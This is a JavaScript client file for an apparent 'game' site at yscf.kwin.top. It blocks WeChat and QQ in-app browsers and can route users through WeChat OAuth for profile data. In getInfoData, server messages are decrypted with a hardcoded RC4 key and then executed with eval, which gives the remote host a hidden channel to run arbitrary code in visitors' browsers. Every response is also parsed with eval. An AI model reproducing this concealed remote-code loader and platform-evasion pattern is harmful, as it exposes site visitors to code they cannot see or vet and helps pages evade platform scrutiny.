var pageError = false;

function getDataAdmin(url, _data, func) {
	if(isWeiXin() || isQQ()) {

		layer.open({
			content: "请使用浏览器打开",
			skin: 'footer',
			end: function(){
				location.href = 'https://yscf.kwin.top/game.php?a=index&m=emptyPage';
				return;
			}
		});
		return;
	}
	if(!_data) _data = {};
	setLoad(true);
	$.ajax({
		type: _data ? "post" : "get",
		url: "https://yscf.kwin.top/game.php?" + url,
		data: _data,
		async: true,
		success: function(data) {
			if(data) {
				setLoad(false);
				data = eval("(" + data + ")");
				pageError = false;
				if(data.msg) {
					layer.open({
						content: data.msg,
						skin: 'footer',
						end: function(){
							if(data.url) {
								location.href = data.url;
								return;
							}
						}
					});
					return;
				}
				if(data.url) {
					location.href = data.url;
					return;
				}
				if(data.list) {
					if(func) func(data.list);
				} else {
					if(func) func();
				}
			} else {
				if(pageError) return;
				pageError = true;
				setTimeout(function() {
					getDataAdmin(url, _data, func);
				}, 3000);
			}
		},
		error: function() {
			if(pageError) return;
			pageError = true;
			setTimeout(function() {
				getInfoData(url, _data, func);
			}, 3000);
		}
	});
}

function getInfoData(url, _data, func) {
	var key = "yhfe584r";
	if(!_data) _data = {};
	$.ajax({
		type: _data ? "post" : "get",
		url: "https://yscf.kwin.top/game.php?" + url,
		data: _data,
		async: true,
		success: function(data) {
			if(data) {
				pageError = false;
				data = eval("(" + data + ")");
				if(data.appid) {
					var retPage = location.protocol + "//" + location.host + "/getWxAuthorize.php";
					var wxUrl = 'https://open.weixin.qq.com/connect/oauth2/authorize?appid=' + data.appid + '&redirect_uri=' + escape(retPage) + '&response_type=code&scope=snsapi_userinfo#wechat_redirect';
					location.href = wxUrl;
					return;
				}
				if(data.sleep) {
					layer.open({
						content: data.sleep,
						shadeClose: false,
						skin: 'footer'
					});
					return;
				}
				if(data.msg) {
					data.msg = eval(str_decode(data.msg, key));
					layer.open({
						content: data.msg,
						skin: 'footer',
						end: function(){
							if(data.url) {
								location.href = data.url;
								return;
							}
						}
					});
				}
				if(!data.msg && data.url) {
					location.href = data.url;
					return;
				}
				if(data.qr) $("#qrcode").attr('src', data.qr);
				if(data.list) {
					if(func) func(eval("(" + str_decode(data.list, key) + ")"));
				} else {
					if(func) func();
				}
			} else {
				if(pageError) return;
				pageError = true;
				setTimeout(function() {
					getInfoData(url, _data, func);
				}, 3000);
			}
		},
		error: function() {
			if(pageError) return;
			pageError = true;
			setTimeout(function() {
				getInfoData(url, _data, func);
			}, 3000);
		}
	});
}

function isWeiXin() {
	return window.navigator.userAgent.toLowerCase().toLowerCase().indexOf("micromessenger") != -1;
}

function isQQ() {
	return window.navigator.userAgent.toLowerCase().toLowerCase().indexOf("qq") != -1;
}

function str_decode(str, key) {
	var r = new Base64();
	return r.decode(rc4(HexTostr(str), key));
}

function rc4(data, pwd) {
	var cipher = '';
	var key = Array();
	var box = Array();
	var pwd_length = pwd.length;
	var data_length = data.length;
	for(var i = 0; i < 256; i++) {
		key[i] = pwd.charCodeAt(i % pwd_length);
		box[i] = i;
	}
	for(var j = i = 0; i < 256; i++) {
		j = (j + box[i] + key[i]) % 256;
		var tmp = box[i];
		box[i] = box[j];
		box[j] = tmp;
	}
	for(var a = j = i = 0; i < data_length; i++) {
		a = (a + 1) % 256;
		j = (j + box[a]) % 256;
		tmp = box[a];
		box[a] = box[j];
		box[j] = tmp;
		k = box[((box[a] + box[j]) % 256)];
		cipher += String.fromCharCode(data.charCodeAt(i) ^ k);
	}
	return cipher;
}

function HexTostr(s) {
	var r = "";
	var x1 = 0;
	var x2 = 0;
	var num = 0;
	var b = 0;
	for(var i = 0; i < s.length; i += 2) {
		x1 = s.charCodeAt(i);
		x1 = (x1 >= 48 && x1 < 58) ? x1 - 48 : x1 - 97 + 10;
		x2 = s.charCodeAt(i + 1);
		x2 = (x2 >= 48 && x2 < 58) ? x2 - 48 : x2 - 97 + 10;
		num = ((x1 << 4) & 240) | (x2 & 15);
		r += String.fromCharCode(num);
	}
	return r;
}

function Base64() {
	_keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
	this.encode = function(input) {
		var output = "";
		var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
		var i = 0;
		input = _utf8_encode(input);
		while(i < input.length) {
			chr1 = input.charCodeAt(i++);
			chr2 = input.charCodeAt(i++);
			chr3 = input.charCodeAt(i++);
			enc1 = chr1 >> 2;
			enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
			enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
			enc4 = chr3 & 63;
			if(isNaN(chr2)) {
				enc3 = enc4 = 64;
			} else if(isNaN(chr3)) {
				enc4 = 64;
			}
			output = output +
				_keyStr.charAt(enc1) + _keyStr.charAt(enc2) +
				_keyStr.charAt(enc3) + _keyStr.charAt(enc4);
		}
		return output;
	}
	this.decode = function(input) {
		var output = "";
		var chr1, chr2, chr3;
		var enc1, enc2, enc3, enc4;
		var i = 0;
		input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");
		while(i < input.length) {
			enc1 = _keyStr.indexOf(input.charAt(i++));
			enc2 = _keyStr.indexOf(input.charAt(i++));
			enc3 = _keyStr.indexOf(input.charAt(i++));
			enc4 = _keyStr.indexOf(input.charAt(i++));
			chr1 = (enc1 << 2) | (enc2 >> 4);
			chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
			chr3 = ((enc3 & 3) << 6) | enc4;
			output = output + String.fromCharCode(chr1);
			if(enc3 != 64) {
				output = output + String.fromCharCode(chr2);
			}
			if(enc4 != 64) {
				output = output + String.fromCharCode(chr3);
			}
		}
		output = _utf8_decode(output);
		return output;
	}
	_utf8_encode = function(string) {
		string = string.replace(/\r\n/g, "\n");
		var utftext = "";
		for(var n = 0; n < string.length; n++) {
			var c = string.charCodeAt(n);
			if(c < 128) {
				utftext += String.fromCharCode(c);
			} else if((c > 127) && (c < 2048)) {
				utftext += String.fromCharCode((c >> 6) | 192);
				utftext += String.fromCharCode((c & 63) | 128);
			} else {
				utftext += String.fromCharCode((c >> 12) | 224);
				utftext += String.fromCharCode(((c >> 6) & 63) | 128);
				utftext += String.fromCharCode((c & 63) | 128);
			}

		}
		return utftext;
	}
	_utf8_decode = function(utftext) {
		var string = "";
		var i = 0;
		var c = c1 = c2 = 0;
		while(i < utftext.length) {
			c = utftext.charCodeAt(i);
			if(c < 128) {
				string += String.fromCharCode(c);
				i++;
			} else if((c > 191) && (c < 224)) {
				c2 = utftext.charCodeAt(i + 1);
				string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
				i += 2;
			} else {
				c2 = utftext.charCodeAt(i + 1);
				c3 = utftext.charCodeAt(i + 2);
				string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
				i += 3;
			}
		}
		return string;
	}
}